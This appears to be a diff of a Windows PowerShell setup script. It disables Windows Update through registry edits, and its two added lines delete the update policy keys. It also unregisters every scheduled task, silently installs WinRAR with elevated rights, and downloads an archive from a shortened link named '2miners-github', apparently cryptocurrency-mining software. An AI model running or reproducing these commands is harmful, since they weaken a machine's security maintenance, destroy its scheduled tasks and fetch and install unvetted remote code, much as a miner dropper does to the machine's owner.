@@ -15,6 +15,8 @@ powershell -NoProfile -Command "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Mi
 powershell -NoProfile -Command "REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 2 /f"
 powershell -NoProfile -Command "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f"
 powershell -NoProfile -Command "Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}"
+powershell -NoProfile -Command "reg delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' /f"
+powershell -NoProfile -Command "reg delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' /f"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/2miners-github -OutFile C:\setup.rar"
